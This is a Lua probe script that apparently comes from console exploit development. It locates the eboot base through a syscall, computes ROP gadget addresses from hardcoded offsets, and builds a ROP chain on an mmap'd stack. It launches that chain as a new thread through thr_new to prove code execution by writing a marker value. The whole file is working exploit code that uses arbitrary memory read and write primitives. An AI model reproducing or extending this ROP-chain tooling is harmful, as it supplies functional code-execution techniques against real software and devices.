-- CRASH_CLASS: LOW
-- PROBE 591b: Minimal child ROP test — write marker + thr_exit
--
-- 56l's child crashes after the write (ret to 0 → SIGSEGV → kills process).
-- Fix: use a mini ROP chain so the child exits cleanly via thr_exit(431).
--
-- Pattern (from 271g):
--   start_func = pop_rax_ret (eboot+0x992)
--   stack_size < mmap_size (chain headroom)
--   Chain: [rax_val from start] [gadgets...] [thr_exit]
--
-- The make_syscall mechanism dumps binary data to stdout for thr_new(455).
-- This is unavoidable — the Lua loader's pipe mechanism does it.
-- The script continues normally after the dump.

print("=== PROBE 591b: CHILD ROP MINIMAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function mk_u64(hi, lo)
    return uint64(string.format("0x%X%08X", hi, lo))
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Eboot base + gadgets
local sc593 = mk(593)
local info = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do wd(N(info) + i, 0) end
wd(N(info), 0x160)
pcall(function() sc593(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
local eb = mk_u64(thi, tlo)
print("eboot=" .. fmt64(eb))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local mov_rdi_rax_ret = eb + uint64(0x92C67)

-- Marker
local marker = memory.alloc(32)
wq(N(marker), mk_u64(0xDEAD, 0xBEEFCAFE))
local mh, ml = get_hi_lo(marker)
local marker_u64 = mk_u64(mh, ml)
print("marker=" .. fmt64(marker_u64) .. " val=" .. fmt64(rq(N(marker))))

-- Stack (2 MiB mmap)
local sc_mmap = mk(477)
local cstack = sc_mmap(uint64(0), uint64(0x200000), uint64(0x3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if N(cstack) == 0 then print("mmap FAILED"); return end
local sh, sl = get_hi_lo(cstack)
local stack_u64 = mk_u64(sh, sl)
local stack_num = N(cstack)

-- RSP: use stack_size < mmap_size so chain fits within allocation
local THR_STACK = 0x1FF000  -- leaves 4KB headroom
local rsp_num = math.floor((stack_num + THR_STACK) / 16) * 16
print("stack=" .. fmt64(stack_u64) .. " rsp=0x" .. string.format("%X", rsp_num))

-- Mini chain: start_func = pop_rax_ret
-- [0] rax value (consumed by start_func's pop rax)
-- Then chain: write marker (mov [rdi], rax; ret) then thr_exit
--
-- But wait — we need rdi=&marker BEFORE mov_rdi_rax_ret.
-- And rax will hold whatever pop_rax loaded.
-- The mov writes the rax value, so we WANT rax to be our "proof" value.
-- Let's set rax = 0x591 (our probe number) as proof.
local chain = {
    -- [0] start_func (pop_rax_ret) pops this into rax
    uint64(0x591),          -- rax = 0x591 (proof value)

    -- [1] set rdi = &marker
    pop_rdi_ret,
    marker_u64,

    -- [3] write rax (0x591) to marker
    mov_rdi_rax_ret,

    -- [4] thr_exit(0): rdi=0, rax=431, jump to stub
    pop_rdi_ret,
    uint64(0),
    pop_rax_ret,
    uint64(431),
    stub,
}

-- Write chain at RSP
for idx, word in ipairs(chain) do
    wq(rsp_num + (idx - 1) * 8, word)
end
print("chain=" .. #chain .. " words at rsp")

-- thr_param
local param = memory.alloc(0x100)
for i = 0, 0x3F, 4 do wd(N(param) + i, 0) end
wq(N(param) + 0x00, pop_rax_ret)            -- start_func
wq(N(param) + 0x08, uint64(0))              -- arg (rdi, overwritten by chain)
wq(N(param) + 0x10, stack_u64)              -- stack_base
wq(N(param) + 0x18, uint64(THR_STACK))      -- stack_size (< mmap_size!)

local tid_buf = memory.alloc(16)
wq(N(tid_buf), uint64(0))
wq(N(param) + 0x30, tid_buf)

print("BEFORE_THR_NEW")

local ok_t, rv_t = pcall(function()
    return mk(455)(param, uint64(0x38))
end)

print("AFTER_THR_NEW")

if not ok_t then
    print("FAILED:" .. tostring(rv_t))
else
    local rv = N(rv_t)
    local tid = rd(N(tid_buf)) or 0
    if tid < 0 then tid = tid + 0x100000000 end
    print("ret=" .. rv .. " tid=" .. tid)
end

-- Wait for child and check marker
for attempt = 1, 50 do
    local val = rq(N(marker))
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0xDEAD or vl ~= 0xBEEFCAFE then
            print("marker=" .. fmt64(val) .. " attempt=" .. attempt)
            if vl == 0x591 and vh == 0 then
                print("PROOF: child wrote 0x591 → ROP chain works!")
            else
                print("CHILD_WROTE: " .. fmt64(val))
            end
            break
        end
    end
    if attempt == 50 then
        print("marker UNCHANGED — child did not write")
    end
    for w = 1, 2000 do end
end

print("")
print("canary=" .. tostring(alive()))
print("=== PROBE 591b COMPLETE ===")
